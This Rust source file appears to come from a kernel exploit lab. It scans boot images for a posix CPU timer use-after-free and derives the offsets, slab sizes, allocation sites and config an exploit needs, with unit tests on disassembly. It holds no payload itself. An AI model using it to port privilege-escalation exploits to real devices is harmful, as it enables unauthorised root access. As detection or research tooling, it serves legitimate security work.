        user_ns_offset: btf.field("cred", "user_ns"),
        ucounts_offset: btf.field("cred", "ucounts"),
        group_info_offset,
        sid_offset: btf.field("task_security_struct", "sid"),
    });
    for field in [
        "cred_usage_size",
        "cred_caps_offset",
        "cred_security_offset",
        "cred_user_offset",
        "cred_group_info_offset",
    ] {
        sources.insert(field.to_string(), Source::Btf);
    }
    (Some(layout), cred, trace, sources)
}

fn layout_from_template(template: &Template) -> (Layout, CredLayout, Sizes) {
    (
        Layout {
            task_cred: template.off_task_cred as u32,
            cred_uid: template.cred_uid_off,
            sizeof_task: template.task_alloc_bytes as u32,
            sizeof_cred: template.cred_req as u32,
            sizeof_kitimer: template.timer_alloc as u32,
        },
        template.cred,
        Sizes {
            timer_alloc: template.timer_alloc,
            cred_req: template.cred_req,
            cred_alloc: template.cred_alloc,
            task_bytes: template.task_alloc_bytes,
        },
    )
}

/// Apply `--layout key=value` overrides; unknown keys are an error.
fn apply_overrides(
    layout: &mut Option<Layout>,
    sizes: &mut Option<Sizes>,
    cred: &mut Option<CredLayout>,
    overrides: &BTreeMap<String, u64>,
    sources: &mut BTreeMap<String, Source>,
) -> Result<()> {
    for (key, value) in overrides {
        match key.as_str() {
            "task_cred_offset" => {
                layout.get_or_insert(Layout::zero()).task_cred = *value as u32;
                sources.insert(key.clone(), Source::Explicit);
            }
            "cred_uid_offset" => {
                layout.get_or_insert(Layout::zero()).cred_uid = *value as u32;
                sources.insert(key.clone(), Source::Explicit);
            }
            "timer_object_size" => {
                sizes.get_or_insert(Sizes::zero()).timer_alloc = *value;
                sources.insert(key.clone(), Source::Explicit);
            }
            "cred_request_size" => {
                sizes.get_or_insert(Sizes::zero()).cred_req = *value;
                sources.insert(key.clone(), Source::Explicit);
            }
            "cred_alloc_size" => {
                sizes.get_or_insert(Sizes::zero()).cred_alloc = *value;
                sources.insert(key.clone(), Source::Explicit);
            }
            "task_alloc_size" => {
                sizes.get_or_insert(Sizes::zero()).task_bytes = *value;
                sources.insert(key.clone(), Source::Explicit);
            }
            "cred_usage_size" | "cred_caps_offset" | "cred_security_offset" | "cred_user_offset"
            | "cred_user_ns_offset" | "cred_ucounts_offset" | "cred_group_info_offset"
            | "security_sid_offset" => {
                let cred = cred.get_or_insert(CredLayout::zero());
                let slot = match key.as_str() {
                    "cred_usage_size" => &mut cred.usage_size,
                    "cred_caps_offset" => &mut cred.caps_offset,
                    "cred_security_offset" => &mut cred.security_offset,
                    "cred_user_offset" => &mut cred.user_offset,
                    "cred_group_info_offset" => &mut cred.group_info_offset,
                    "cred_user_ns_offset" => {
                        cred.user_ns_offset = Some(*value as u32);
                        sources.insert(key.clone(), Source::Explicit);
                        continue;
                    }
                    "cred_ucounts_offset" => {
                        cred.ucounts_offset = Some(*value as u32);
                        sources.insert(key.clone(), Source::Explicit);
                        continue;
                    }
                    "security_sid_offset" => {
                        cred.sid_offset = Some(*value as u32);
                        sources.insert(key.clone(), Source::Explicit);
                        continue;
                    }
                    _ => unreachable!(),
                };
                *slot = *value as u32;
                sources.insert(key.clone(), Source::Explicit);
            }
            "timer_node_offset" => {
                sources.insert(key.clone(), Source::Explicit);
            }
            "trace.gfp_offset" | "trace.gfp_size" => {
                sources.insert(key.clone(), Source::Explicit);
            }
            other => {
                return Err(ExtractError::new(format!("unknown --layout key {other}")));
            }
        }
    }
    Ok(())
}

impl Layout {
    fn zero() -> Layout {
        Layout {
            task_cred: 0,
            cred_uid: 0,
            sizeof_task: 0,
            sizeof_cred: 0,
            sizeof_kitimer: 0,
        }
    }
}

impl Sizes {
    fn zero() -> Sizes {
        Sizes {
            timer_alloc: 0,
            cred_req: 0,
            cred_alloc: 0,
            task_bytes: 0,
        }
    }
}

impl CredLayout {
    fn zero() -> CredLayout {
        CredLayout {
            usage_size: 0,
            caps_offset: 0,
            caps_count: 0,
            security_offset: 0,
            user_offset: 0,
            user_ns_offset: None,
            ucounts_offset: None,
            group_info_offset: 0,
            sid_offset: None,
        }
    }
}

/// Full analysis with the caller's options; the shipped entry point.
pub fn analyze(image: &Path, options: &Options) -> Result<Analysis> {
    let boot = BootImage::load(image)?;
    let btf_blob = boot.embedded_btf_at();
    let btf_at = btf_blob
        .as_ref()
        .map(|(offset, blob)| (*offset, blob.len()));
    let ks = kallsyms_finder::recover(&boot.kernel, btf_at)?;
    let syms = Symbols::new(&ks)?;
    let btf = btf_blob
        .as_ref()
        .map(|(_, blob)| Btf::new(blob))
        .transpose()?;
    let config = ikconfig::embedded_config(&boot.kernel);

    let mut analysis = Analysis {
        release: boot.release(),
        text_base: Some(syms.text_base()),
        symbol_count: ks.symbols.len(),
        has_btf: btf.is_some(),
        has_ikconfig: config.is_some(),
        config: config.clone().unwrap_or_default(),
        sites: None,
        data_symbols: BTreeMap::new(),
        layout: None,
        cred: None,
        sizes: None,
        timer_node_off: None,
        trace_gfp_off: None,
        trace_gfp_size: None,
        sources: BTreeMap::new(),
        corroborated: BTreeMap::new(),
        order: None,
        del: None,
        trigger: None,
        verdict: Verdict::Unknown("not checked".to_string()),
        runtime: options.runtime.clone(),
        missing: Vec::new(),
        warnings: Vec::new(),
        notes: Vec::new(),
    };

    // --- vulnerability state (always; BTF-free) ----------------------------
    match syms.rel("begin_new_exec") {
        Some(begin_new_exec) => {
            let code =
                disassemble_function(&boot.kernel, begin_new_exec, syms.extent(begin_new_exec))?;
            analysis.order = Some(check_exec_timer_order(&code, &syms));
        }
        None => analysis
            .notes
            .push("begin_new_exec: symbol absent".to_string()),
    }
    let del = match syms.rel("posix_cpu_timer_del") {
        Some(del_start) => {
            let code = disassemble_function(&boot.kernel, del_start, syms.extent(del_start))?;
            check_posix_cpu_timer_del(
                &code,
                syms.rel("pid_task"),
                &[syms.rel("timerqueue_del"), syms.rel("rb_erase")],
                syms.rel("__rcu_read_unlock"),
            )
        }
        None => None,
    };
    analysis.del = del;
    if analysis.del.is_none() {
        analysis
            .notes
            .push("posix_cpu_timer_del: pid_task() call or NULL branch not recognised".to_string());
    }
    // The bug needs both halves: the exec path leaves a stale node when the
    // pid vanishes, and the delete path does not dequeue it. Either half fixed
    // rules the exploit out; a check that could not run is `unknown`.
    analysis.verdict = match (&analysis.order, &analysis.del) {
        (Some(order), _) if order.known && order.cleanup_first => Verdict::Patched,
        (_, Some(del)) if !del.leaves_node_queued => Verdict::Patched,
        (Some(order), Some(_)) if order.known => Verdict::Vulnerable,
        (None, _) => Verdict::Unknown("begin_new_exec not recognised".to_string()),
        (_, None) => Verdict::Unknown("posix_cpu_timer_del not recognised".to_string()),
        (Some(_), Some(_)) => {
            Verdict::Unknown("begin_new_exec: no fallible operation call found".to_string())
        }
    };

    if options.detect_only {
        return Ok(analysis);
    }

    // --- exec trigger shape ------------------------------------------------
    analysis.trigger = Some(check_trigger_shape(&boot.kernel, &syms));

    // --- sites -------------------------------------------------------------
    let (sites, site_sources) = derive_sites(&boot.kernel, &syms, &mut analysis.notes);
    analysis.sites = sites;
    analysis.sources.extend(site_sources);

    // --- data symbols ------------------------------------------------------
    for (macro_name, symbol) in DATA_SYMBOLS {
        let value = syms.rel(symbol).map(|rel| syms.abs(rel));
        if value.is_some() {
            analysis
                .sources
                .insert((*macro_name).to_string(), Source::Image);
        }
        analysis.data_symbols.insert((*macro_name).to_string(), value);
    }

    // --- layout ------------------------------------------------------------
    if !options.no_layout {
        let mut sources = BTreeMap::new();
        let mut layout = None;
        let mut cred = None;
        match (btf.as_ref(), options.layout_template.as_deref()) {
            (Some(btf), _) => {
                let (btf_layout, btf_cred, btf_trace, btf_sources) =
                    derive_btf_layout(btf);
                layout = btf_layout;
                cred = btf_cred;
                if let Some((off, size)) = btf_trace {
                    analysis.trace_gfp_off = Some(off);
                    analysis.trace_gfp_size = Some(size);
                }
                sources.extend(btf_sources);
            }
            (None, Some(name)) => {
                let template = facts::template_by_name(name).ok_or_else(|| {
                    ExtractError::new(format!(
                        "unknown --layout-template {name} (known: 5.10)"
                    ))
                })?;
                let (t_layout, t_cred, _) = layout_from_template(template);
                layout = Some(t_layout);
                cred = Some(t_cred);
                analysis.timer_node_off = Some(template.timer_node_off);
                analysis.trace_gfp_off = Some(template.trace_gfp_off);
                analysis.trace_gfp_size = Some(template.trace_gfp_size);
                sources.insert("trace.gfp_offset".to_string(), Source::Template);
                sources.insert("trace.gfp_size".to_string(), Source::Template);
                for field in [
                    "task_alloc_size",
                    "cred_request_size",
                    "cred_alloc_size",
                    "timer_object_size",
                    "task_cred_offset",
                    "cred_uid_offset",
                    "cred_usage_size",
                    "cred_caps_offset",
                    "cred_security_offset",
                    "cred_user_offset",
                    "cred_group_info_offset",
                ] {
                    sources.insert(field.to_string(), Source::Template);
                }
                analysis.warnings.push(format!(
                    "layout template 5.10 applied (no BTF): every template field is labelled and needs runtime corroboration"
                ));
            }
            (None, None) => {
                analysis.warnings.push(
                    "no BTF and no --layout-template: sizes and offsets are not derivable".to_string(),
                );
            }
        }
        let mut sizes = if let Some(layout) = &layout {
            Some(Sizes {
                timer_alloc: plain_cache_size(layout.sizeof_kitimer as u64),
                cred_req: layout.sizeof_cred as u64,
                cred_alloc: hwcache_size(layout.sizeof_cred as u64),
                task_bytes: layout.sizeof_task as u64,
            })
        } else {
            None
        };
        apply_overrides(&mut layout, &mut sizes, &mut cred, &options.overrides, &mut sources)?;

        // timer_node_off: the k_itimer `it` member starts with cpu_timer.node.
        if let Some(btf) = btf.as_ref() {
            if let Some(it) = btf.field("k_itimer", "it") {
                analysis.timer_node_off = Some(it as u64);
            }
        }
        if let (Some(node), Some(source)) = (
            analysis.timer_node_off,
            options.overrides.get("timer_node_offset"),
        ) {
            if node != *source {
                analysis.warnings.push(format!(
                    "timer_node_offset override {source:#x} differs from the image's {node:#x}"
                ));
                analysis.timer_node_off = Some(*source);
            }
        }
        if let Some(node) = analysis.timer_node_off {
            if node != 0x78 {
                analysis.warnings.push(format!(
                    "k_itimer node offset {node:#x} differs from the tool's compiled 0x78"
                ));
            }
        }

        analysis.layout = layout;
        analysis.cred = cred;
        analysis.sizes = sizes;
        analysis.sources.extend(sources);
    }

    // --- runtime facts: complete and verify --------------------------------
    if let Some(runtime) = &options.runtime {
        verify_runtime(&mut analysis, runtime)?;
    }

    // --- config ------------------------------------------------------------
    if analysis.has_ikconfig {
        for (symbol, wanted) in ikconfig::REQUIRED_CONFIG {
            match analysis.config.get(*symbol) {
                Some(value) if value == wanted => {}
                Some(value) => analysis.warnings.push(format!(
                    "{symbol} = {value} (the exploit needs {wanted})"
                )),
                None => analysis
                    .warnings
                    .push(format!("{symbol} absent from the image config")),
            }
        }
    } else {
        analysis
            .warnings
            .push("image carries no IKCONFIG blob; config checks are runtime-only".to_string());
    }

    // --- required fields ---------------------------------------------------
    analysis.missing = analysis.check_real_path();
    Ok(analysis)
}

/// Fold the runtime fact file into the analysis, refusing disagreements.
fn verify_runtime(analysis: &mut Analysis, runtime: &RuntimeFacts) -> Result<()> {
    if let (Some(expected), Some(measured)) = (analysis.release.as_deref(), runtime.uname.as_deref())
    {
        if expected != measured {
            return Err(ExtractError::new(format!(
                "runtime facts are for {measured}, the image is {expected}"
            )));
        }
    }

    // Sizes: BTF/template vs the slab lines. The slab's `objsize` is the
    // allocation side, so timer_object_size and cred_alloc_size must match exactly; the
    // requested sizes must not exceed it.
    if let Some(sizes) = &mut analysis.sizes {
        if let Some(slab) = runtime.slab_size("posix_timers_cache") {
            if sizes.timer_alloc != 0 && sizes.timer_alloc != slab {
                return Err(ExtractError::new(format!(
                    "posix_timers_cache objsize {slab} disagrees with the derived timer_object_size {}",
                    sizes.timer_alloc
                )));
            }
            if sizes.timer_alloc == 0 {
                sizes.timer_alloc = slab;
                analysis
                    .sources
                    .insert("timer_object_size".to_string(), Source::Slabinfo);
            }
            analysis
                .corroborated
                .insert("timer_object_size".to_string(), Source::Slabinfo);
        }
        if let Some(slab) = runtime.slab_size("cred_jar") {
            if sizes.cred_alloc != 0 && sizes.cred_alloc != slab {
                return Err(ExtractError::new(format!(
                    "cred_jar objsize {slab} disagrees with the derived cred_alloc {}",
                    sizes.cred_alloc
                )));
            }
            if sizes.cred_alloc == 0 {
                sizes.cred_alloc = slab;
                analysis
                    .sources
                    .insert("cred_alloc_size".to_string(), Source::Slabinfo);
            }
            analysis
                .corroborated
                .insert("cred_alloc_size".to_string(), Source::Slabinfo);
        }
        if let Some(slab) = runtime.slab_size("task_struct") {
            if sizes.task_bytes != 0 && slab < sizes.task_bytes {
                return Err(ExtractError::new(format!(
                    "task_struct objsize {slab} is below the derived size {}",
                    sizes.task_bytes
                )));
            }
            if sizes.task_bytes == 0 {
                sizes.task_bytes = slab;
                analysis
                    .sources
                    .insert("task_alloc_size".to_string(), Source::Slabinfo);
            } else if sizes.task_bytes == slab {
                // The slab's objsize is the allocation side; it equals the
                // struct size only when SLUB does not round.
                analysis
                    .corroborated
                    .insert("task_alloc_size".to_string(), Source::Slabinfo);
            }
        }
    }

    // Probe values the tool measured: the sites must agree with the image.
    if let (Some(site), Some(measured)) = (
        analysis.site("timer_site_lower_21bit"),
        runtime.probe.get("timer_site_low21"),
    ) {
        if site != *measured {
            return Err(ExtractError::new(format!(
                "runtime timer_site_low21 {measured:#x} disagrees with the image's {site:#x}"
            )));
        }
        analysis
            .corroborated
            .insert("timer_site_lower_21bit".to_string(), Source::Runtime);
    }
    if let (Some(site), Some(measured)) = (
        analysis.site("task_alloc_site_lower_21bit"),
        runtime.probe.get("copy_process_low21"),
    ) {
        if site != *measured {
            return Err(ExtractError::new(format!(
                "runtime copy_process_low21 {measured:#x} disagrees with the image's {site:#x}"
            )));
        }
        analysis
            .corroborated
            .insert("task_alloc_site_lower_21bit".to_string(), Source::Runtime);
    }

    Ok(())
}

/// The strict entry point used by `--add` (the lab corpus: BTF required).
pub fn derive(image: &Path) -> Result<Facts> {
    let analysis = analyze(image, &Options::default())?;
    facts_from_analysis(&analysis)
}

/// Convert a completed analysis into the `Facts` the lab registry needs.
/// Every field must be image-derived (or, with explicit options, labelled).
pub fn facts_from_analysis(analysis: &Analysis) -> Result<Facts> {
    if !analysis.has_btf {
        return Err(ExtractError::new(
            "kernel carries no embedded BTF; --add needs the full layout",
        ));
    }
    let release = analysis
        .release
        .clone()
        .ok_or_else(|| ExtractError::new("image carries no kernel release string"))?;
    let sites = analysis
        .sites
        .ok_or_else(|| ExtractError::new("trace sites not derived"))?;
    let layout = analysis
        .layout
        .ok_or_else(|| ExtractError::new("BTF layout not derived"))?;
    let sizes = analysis
        .sizes
        .ok_or_else(|| ExtractError::new("sizes not derived"))?;
    let order = analysis
        .order
        .clone()
        .ok_or_else(|| ExtractError::new("begin_new_exec not recognised"))?;
    let del = analysis
        .del
        .clone()
        .ok_or_else(|| ExtractError::new("posix_cpu_timer_del not recognised"))?;
    let mut data_symbols = BTreeMap::new();
    for (macro_name, symbol) in DATA_SYMBOLS {
        let value = analysis
            .data_symbols
            .get(*macro_name)
            .copied()
            .flatten()
            .ok_or_else(|| ExtractError::new(format!("kallsyms has no unique symbol {symbol}")))?;
        data_symbols.insert((*macro_name).to_string(), value);
    }
    Ok(Facts {
        release: Some(release),
        text_base: analysis.text_base.unwrap_or(0),
        sites,
        data_symbols,
        layout,
        sizes,
        order,
        del,
        verdict: analysis.verdict.clone(),
    })
}

// ---------------------------------------------------------------------------
// tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn code(start: u64, lines: &[&str]) -> Code {
        Code {
            start,
            lines: lines.iter().map(|line| (*line).to_string()).collect(),
        }
    }

    fn symbols(pairs: &[(&str, u64)]) -> Symbols {
        let base = 0xffff_ffc0_8000_0000u64;
        let mut table = BTreeMap::new();
        table.insert("_text".to_string(), 0u64);
        for (name, rel) in pairs {
            table.insert((*name).to_string(), *rel);
        }
        let mut sorted: Vec<u64> = table.values().copied().collect();
        sorted.sort_unstable();
        sorted.dedup();
        Symbols {
            text_base: base,
            table,
            sorted,
        }
    }

    #[test]
    fn killable_read_lock_is_the_sigkill_trigger() {
        // 6.1.138 exec_mmap: the inlined mmap_read_lock_killable.
        let syms = symbols(&[("down_read_killable", 0x100)]);
        let body = code(
            0x1000,
            &[
                "add x0, x19, #0x60",
                "bl 0x100",
                "cbz w0, 0x1010",
                "mov w22, w0",
            ],
        );
        let check = trigger_in(&body, &syms, "exec_mmap").unwrap();
        assert_eq!(check.shape, TriggerShape::Killable);
        assert_eq!(
            check.lock_call.as_ref().map(|(name, at)| (name.as_str(), *at)),
            Some(("down_read_killable", 0x1004))
        );
    }

    #[test]
    fn core_state_read_lock_is_the_coredump_trigger() {
        // 5.10.236 exec_mmap: non-killable __down_read then old_mm->core_state.
        let syms = symbols(&[("__down_read", 0x200), ("down_read", 0x201)]);
        let body = code(
            0x1000,
            &[
                "add x22, x19, #0x70",
                "mov x0, x22",
                "bl 0x200",
                "ldr x8, [x19, #0x330]",
                "cbnz x8, 0x1100",
                "b 0x1018",
            ],
        );
        let check = trigger_in(&body, &syms, "exec_mmap").unwrap();
        assert_eq!(check.shape, TriggerShape::CoreState);
        assert_eq!(check.core_state_test, Some(0x100c));
    }

    #[test]
    fn rwsem_slow_path_with_core_state_matches() {
        // 5.15.194 exec_mmap: trylock then the non-killable slow path.
        let syms = symbols(&[
            ("rwsem_read_trylock", 0x300),
            ("rwsem_down_read_slowpath", 0x400),
        ]);
        let body = code(
            0x1000,
            &[
                "bl 0x300",
                "tbnz w0, #0x0, 0x1018",
                "mov w2, #0x2",
                "bl 0x400",
                "nop",
                "ldr x8, [x19, #0x330]",
                "add x23, x21, #0x7f0",
                "cbz x8, 0x1020",
            ],
        );
        let check = trigger_in(&body, &syms, "exec_mmap").unwrap();
        assert_eq!(check.shape, TriggerShape::CoreState);
        assert_eq!(check.core_state_test, Some(0x1014));
    }

    #[test]
    fn a_body_without_a_read_lock_has_no_trigger_evidence() {
        let syms = symbols(&[("down_read_killable", 0x100)]);
        let body = code(0x1000, &["bl 0x200", "ret"]);
        assert!(trigger_in(&body, &syms, "exec_mmap").is_none());
        let none = check_trigger_shape(&[], &symbols(&[]));
        assert_eq!(none.shape, TriggerShape::Unknown);
        assert_eq!(none.function, "none");
    }

    #[test]
    fn lto_suffixed_names_resolve_only_when_unique() {
        let syms = symbols(&[
            ("posix_cpu_timer_del.llvm.123", 0x20),
            ("dup_task_struct.llvm.7", 0x30),
            ("dup_task_struct.llvm.9", 0x40),
        ]);
        assert_eq!(syms.rel("posix_cpu_timer_del"), Some(0x20));
        assert_eq!(syms.rel("dup_task_struct"), None);
        assert_eq!(syms.rel("absent"), None);
    }

    #[test]
    fn timer_site_is_the_allocator_return_address() {
        // do_timer_create+0x84..0x94 from a 6.12.69 Android image.
        let body = code(
            0x35_782c,
            &[
                "adrp x8, 0x285f000",
                "mov w1, #0xdc0",
                "ldr x0, [x8, #0x3f0]",
                "bl 0x1419dc",
                "mov x19, x0",
            ],
        );
        let site = find_cache_alloc_site(&body, 0x28_5f3f0, &[0x14_19dc]).unwrap();
        assert_eq!(site, 0x35_783c);
        assert_eq!(site & LOW21_MASK, 0x15_783c);
    }

    #[test]
    fn task_site_uses_the_node_allocator() {
        let body = code(
            0x0f_430c,
            &[
                "adrp x8, 0x2836000",
                "mov w1, #0xcc0",
                "mov w2, w26",
                "ldr x0, [x8, #0x6c8]",
                "bl 0x1415d8",
                "mov x20, x0",
            ],
        );
        let site = find_cache_alloc_site(&body, 0x28_366c8, &[0x14_15d8]).unwrap();
        assert_eq!(site, 0x0f_4320);
    }

    #[test]
    fn a_move_through_register_keeps_the_allocation_match() {
        // 5.10.236 dup_task_struct: the cache lands in x8, then x0.
        let body = code(
            0x1000,
            &[
                "adrp x23, 0x2990000",
                "ldr x8, [x23, #0x180]",
                "mov w21, w1",
                "mov x20, x0",
                "mov w1, #0xcc0",
                "mov x0, x8",
                "bl 0x4e6d10",
            ],
        );
        let site = find_cache_alloc_site(&body, 0x299_0180, &[0x4e_6d10]).unwrap();
        assert_eq!(site, 0x101c);
    }

    #[test]
    fn adrp_add_pairs_are_followed() {
        let body = code(
            0x1000,
            &[
                "adrp x9, 0x285f000",
                "add x9, x9, #0x3f0",
                "ldr x0, [x9]",
                "bl 0x100",
            ],
        );
        let site = find_cache_alloc_site(&body, 0x28_5f3f0, &[0x100]).unwrap();
        assert_eq!(site, 0x1010);
    }

    #[test]
    fn a_reused_register_drops_the_stale_add_address() {
        // 6.12.23 do_timer_create+0x9c..0xb0: x8 first holds an add-derived
        // table address, then a fresh adrp reloads it for posix_timers_cache.
        let body = code(
            0x1000,
            &[
                "adrp x9, 0x1247000",
                "add x9, x9, #0xaf8",
                "adrp x8, 0x1247000",
                "add x8, x8, #0xc78",
                "csel x23, x8, x9, eq",
                "adrp x8, 0x2754000",
                "mov w1, #0xdc0",
                "ldr x0, [x8, #0x970]",
                "bl 0x3dc6e4",
                "mov x19, x0",
            ],
        );
        let site = find_cache_alloc_site(&body, 0x275_4970, &[0x3d_c6e4]).unwrap();
        assert_eq!(site, 0x1024);
    }

    #[test]
    fn a_load_replaces_the_destination_register() {
        // The first load consumes the adrp address; the second must not be
        // read as a second dereference of the same page.
        let body = code(
            0x1000,
            &[
                "adrp x8, 0x2754000",
                "ldr x9, [x8, #0x970]",
                "ldr x0, [x9]",
                "bl 0x3dc6e4",
            ],
        );
        assert!(find_cache_alloc_site(&body, 0x275_4970, &[0x3d_c6e4]).is_none());
    }

    #[test]
    fn wrong_cache_never_matches() {
        let body = code(
            0x1000,
            &["adrp x8, 0x2836000", "ldr x0, [x8, #0x6c8]", "bl 0x100"],
        );
        assert!(find_cache_alloc_site(&body, 0x28_5f3f0, &[0x100]).is_none());
    }

    #[test]
    fn vulnerable_order_cleans_timers_after_task_namespaces() {
        let syms = symbols(&[
            ("unshare_files", 0x10),
            ("set_mm_exe_file", 0x20),
            ("exec_task_namespaces", 0x30),
            ("posix_cpu_timers_exit", 0x40),
            ("exit_itimers", 0x50),
            ("flush_itimer_signals", 0x60),
        ]);
        let body = code(
            0x1000,
            &[
                "bl 0x10", "bl 0x20", "bl 0x30", "bl 0x40", "bl 0x50", "bl 0x60",
            ],
        );
        let order = check_exec_timer_order(&body, &syms);
        assert!(!order.cleanup_first);
        assert_eq!(order.calls[0].0, "unshare_files");
        assert_eq!(order.calls[3].0, "posix_cpu_timers_exit");
    }

    #[test]
    fn fixed_order_cleans_timers_first() {
        let syms = symbols(&[
            ("unshare_files", 0x10),
            ("set_mm_exe_file", 0x20),
            ("exec_task_namespaces", 0x30),
            ("posix_cpu_timers_exit", 0x40),
            ("exit_itimers", 0x50),
        ]);
        let body = code(
            0x2000,
            &["bl 0x40", "bl 0x50", "bl 0x10", "bl 0x20", "bl 0x30"],
        );
        assert!(check_exec_timer_order(&body, &syms).cleanup_first);
    }

    #[test]
    fn null_pid_path_leaves_the_node_queued() {
        // posix_cpu_timer_del around the `pid_task() == NULL` branch.
        let body = code(
            0x5c_0528,
            &[
                "bl 0x9ffe4",
                "ldr x0, [x19, #0xa0]",
                "bl 0x10660c",
                "cbz x0, 0x5c056c",
                "bl 0x1dba1c",
                "cbnz w0, 0x5c052c",
                "bl 0xbaa2c",
                "ldr x0, [x19, #0x98]",
                "bl 0x12842c",
                "bl 0x12ac6b4",
                "ret",
                "dmb ishld",
                "ldr x8, [x19, #0x98]",
                "cbz x8, 0x5c0580",
                "brk #0x800",
                "b 0x5c058c",
                "ldr x8, [x21]",
                "cmp x8, x21",
                "b.ne 0x5c0578",
                "bl 0xbaa2c",
                "b 0x5c05f0",
            ],
        );
        let check = check_posix_cpu_timer_del(
            &body,
            Some(0x10_660c),
            &[Some(0x12_842c)],
            Some(0x0b_aa2c),
        )
        .unwrap();
        assert!(check.leaves_node_queued);
        assert_eq!(check.null_path, 0x5c_056c);
    }

    #[test]
    fn a_null_path_that_dequeues_is_not_vulnerable() {
        let body = code(
            0x1000,
            &[
                "bl 0x100",
                "cbz x0, 0x1014",
                "bl 0x200",
                "ret",
                "bl 0x300",
                "bl 0x400",
                "bl 0x300",
                "ret",
            ],
        );
        let check =
            check_posix_cpu_timer_del(&body, Some(0x100), &[Some(0x400)], Some(0x300)).unwrap();
        assert!(!check.leaves_node_queued);
        assert!(check.dequeues);
        assert_eq!(check.null_path, 0x1014);
    }

    #[test]
    fn inlined_pid_task_null_path_skips_the_dequeue() {
        // 5.10.236 posix_cpu_timer_del: pid_task() is inlined; the task-list
        // head load (ldar) is followed by the NULL branch to the put_pid exit.
        let body = code(
            0x1000,
            &[
                "ldr x8, [x0, #0xa0]",   // 0x1000 pid load
                "cbz x8, 0x1040",        // 0x1004 pid == NULL
                "ldr w9, [x20, #0x30]",  // 0x1008
                "add x8, x8, x9, lsl #3",
                "add x8, x8, #0x10",
                "ldar x8, [x8]",         // 0x1014 the inlined pid_task head
                "cbz x8, 0x1040",        // 0x1018 p == NULL
                "sub x8, x8, x9, lsl #4",
                "sub x21, x8, #0x638",
                "bl 0x5000",             // 0x1024 __lock_task_sighand
                "cbz x0, 0x1060",        // 0x1028
                "bl 0x6000",             // 0x102c rb_erase (the dequeue)
                "ret",
                "nop",
                "nop",
                "nop",
                "ldr w8, [x19, #0x448]", // 0x1040 the NULL path
                "ldr x1, [x20, #0xa0]",
                "cbz x1, 0x1058",
                "bl 0x7000",             // 0x104c kmem_cache_free
                "b 0x1058",              // 0x1050
                "nop",
                "ret",                   // 0x1058
            ],
        );
        let check = check_posix_cpu_timer_del(
            &body,
            Some(0x1767a0),
            &[Some(0xa7b880), Some(0x6000)],
            Some(0x2419bc),
        );
        let check = check.expect("the inlined pid_task branch is recognised");
        assert_eq!(check.null_path, 0x1040);
        assert!(check.leaves_node_queued);
        assert!(!check.dequeues);
    }

    #[test]
    fn inlined_pid_task_with_a_dequeuing_null_path_is_not_vulnerable() {
        let _body = code(
            0x1000,
            &[
                "ldar x8, [x9]",
                "cbz x8, 0x1020",
                "sub x8, x8, x10, lsl #4",
                "ret",
                "bl 0x300", // 0x1010
                "ret",
                "bl 0x400", // 0x1018 (the dequeue)
                "ret",
            ],
        );
        // 0x1020 is past this short body; point the branch at 0x1018 instead.
        let body = Code {
            start: 0x1000,
            lines: vec![
                "ldar x8, [x9]".to_string(),
                "cbz x8, 0x1018".to_string(),
                "sub x8, x8, x10, lsl #4".to_string(),
                "ret".to_string(),
                "bl 0x300".to_string(),
                "ret".to_string(),
                "bl 0x400".to_string(),
                "ret".to_string(),
            ],
        };
        let check =
            check_posix_cpu_timer_del(&body, None, &[Some(0x400)], Some(0x300)).unwrap();
        assert!(check.dequeues);
        assert!(!check.leaves_node_queued);
    }

    #[test]
    fn exec_order_counts_exec_mmap_as_fallible() {
        let syms = symbols(&[
            ("exec_mmap", 0x10),
            ("posix_cpu_timers_exit", 0x40),
            ("exit_itimers", 0x50),
        ]);
        let late = code(0x1000, &["bl 0x10", "bl 0x40", "bl 0x50"]);
        let order = check_exec_timer_order(&late, &syms);
        assert!(order.known);
        assert!(!order.cleanup_first);

        let early = code(0x1000, &["bl 0x40", "bl 0x50", "bl 0x10"]);
        let order = check_exec_timer_order(&early, &syms);
        assert!(order.known);
        assert!(order.cleanup_first);
    }

    #[test]
    fn exec_order_without_an_anchor_is_unknown() {
        let syms = symbols(&[("posix_cpu_timers_exit", 0x40)]);
        let body = code(0x1000, &["bl 0x40"]);
        let order = check_exec_timer_order(&body, &syms);
        assert!(!order.known);
    }

    #[test]
    fn slab_sizes_follow_slub_rules() {
        // Values recorded on the first 6.12.69 target build.
        assert_eq!(plain_cache_size(0x100), 0x100);
        assert_eq!(hwcache_size(0xb8), 0xc0);
        assert_eq!(hwcache_size(0x1440), 0x1440);
    }

}

